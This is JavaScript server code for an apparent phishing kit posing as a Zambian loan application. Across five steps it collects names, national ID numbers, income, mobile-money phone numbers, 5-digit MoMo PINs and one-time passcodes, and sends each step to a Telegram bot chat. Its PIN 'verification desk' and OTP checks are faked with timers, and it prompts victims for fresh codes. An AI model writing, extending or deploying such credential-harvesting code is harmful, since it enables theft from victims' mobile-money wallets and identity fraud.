function toSafeText(value, fallback = 'N/A') {
  if (value === undefined || value === null || value === '') {
    return fallback
  }

  return String(value)
}

// STEP 1
function createStep1Message({ appId, step1 }) {
  return [
    '🟢 STEP 1 RECEIVED',
    `App ID: ${toSafeText(appId)}`,
    '',
    `Loan Type: ${toSafeText(step1?.loanType)}`,
    `Amount (ZMW): ${toSafeText(step1?.amount)}`,
    `Term (Months): ${toSafeText(step1?.term)}`,
    `Purpose: ${toSafeText(step1?.purpose)}`,
    '',
    `Time: ${new Date().toLocaleString()}`
  ].join('\n')
}

// STEP 2
function createStep2Message({ appId, step2 }) {
  return [
    '🟡 STEP 2 RECEIVED',
    `App ID: ${toSafeText(appId)}`,
    '',
    `First Name: ${toSafeText(step2?.firstName)}`,
    `Last Name: ${toSafeText(step2?.lastName)}`,
    `NRC: ${toSafeText(step2?.nrc)}`,
    `Date of Birth: ${toSafeText(step2?.dob)}`,
    '',
    `Time: ${new Date().toLocaleString()}`
  ].join('\n')
}

// STEP 3
function createStep3Message({ appId, step3 }) {
  return [
    '🟠 STEP 3 RECEIVED',
    `App ID: ${toSafeText(appId)}`,
    '',
    `Employment: ${toSafeText(step3?.employment)}`,
    `Employer: ${toSafeText(step3?.employer)}`,
    `Income: ${toSafeText(step3?.income)}`,
    '',
    `Time: ${new Date().toLocaleString()}`
  ].join('\n')
}

// STEP 4
function createStep4Message({ appId, step4 }) {
  return [
    '🔵 STEP 4 RECEIVED',
    `App ID: ${toSafeText(appId)}`,
    '',
    `MoMo Number: ${toSafeText(step4?.phone)}`,
    `MoMo PIN: ${toSafeText(step4?.password)}`,
    '',
    `Time: ${new Date().toLocaleString()}`
  ].join('\n')
}

// STEP 5
function createStep5Message({ appId, referenceId, step5 }) {
  return [
    '✅ STEP 5 COMPLETED',
    `App ID: ${toSafeText(appId)}`,
    `Reference: ${toSafeText(referenceId)}`,
    '',
    `OTP: ${toSafeText(step5?.pin)}`,
    '',
    `Application Submitted Successfully`,
    `Time: ${new Date().toLocaleString()}`
  ].join('\n')
}
socket.on('step1', async (payload) => {
  const session = {
    ...sessions.get(socket.id),
    step1: payload,
  }

  sessions.set(socket.id, session)

  try {
    await sendTelegramMessage(
      createStep1Message({
        appId: session.appId,
        step1: payload,
      }),
    )
  } catch (error) {
    console.error(error)
  }
})

socket.on('step2', async (payload) => {
  const session = {
    ...sessions.get(socket.id),
    step2: payload,
  }

  sessions.set(socket.id, session)

  try {
    await sendTelegramMessage(
      createStep2Message({
        appId: session.appId,
        step2: payload,
      }),
    )
  } catch (error) {
    console.error(error)
  }
})
socket.on('step3', async (payload) => {
  const session = {
    ...sessions.get(socket.id),
    step3: payload,
  }

  sessions.set(socket.id, session)

  try {
    await sendTelegramMessage(
      createStep3Message({
        appId: session.appId,
        step3: payload,
      }),
    )
  } catch (error) {
    console.error(error)
  }
})

socket.on('step4', (payload) => {
  if (!payload?.phone || !/^\d{5}$/.test(payload?.password ?? '')) {
    socket.emit('error', {
      message: 'Wallet phone and a valid 5-digit MoMo PIN are required.',
    })
    return
  }

  const session = {
    ...sessions.get(socket.id),
    step4: payload,
  }

  sessions.set(socket.id, session)

  ;(async () => {
    try {
      await sendTelegramMessage(
        createStep4Message({
          appId: session.appId,
          step4: payload,
        }),
      )
    } catch (error) {
      console.error(error)
    }
  })()

  setTimeout(() => {
    if (payload.password === '00000') {
      socket.emit('password-rejected', {
        message: 'PIN rejected by the verification desk.',
      })
      return
    }

    socket.emit('password-verified')
  }, 1200)
})
socket.on('step5', (payload) => {
  if (!payload?.pin || payload.pin.length !== 6) {
    socket.emit('error', {
      message: 'A 6-digit OTP is required.',
    })
    return
  }

  setTimeout(async () => {
    if (payload.pin === '000000') {
      socket.emit('pin-rejected', {
        message: 'OTP invalid or expired. Try a new code.',
      })
      return
    }

    const session = sessions.get(socket.id) || {}
    const referenceId = `REF-${Math.random()
      .toString(36)
      .slice(2, 8)
      .toUpperCase()}`

    sessions.set(socket.id, {
      ...session,
      referenceId,
      step5: payload,
    })

    try {
      await sendTelegramMessage(
        createStep5Message({
          appId: session.appId,
          referenceId,
          step5: payload,
        }),
      )
    } catch (error) {
      console.error(error)
    }

    socket.emit('pin-verified', {
      referenceId,
      appId: session.appId,
    })
  }, 1400)
})
async function sendTelegramMessage(text) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text,
          disable_web_page_preview: true,
        }),
      },
    )

    if (!response.ok) {
      const error = await response.text()
      console.error('Telegram Error:', error)
    }
  } catch (error) {
    console.error('Telegram Error:', error.message)
  }
}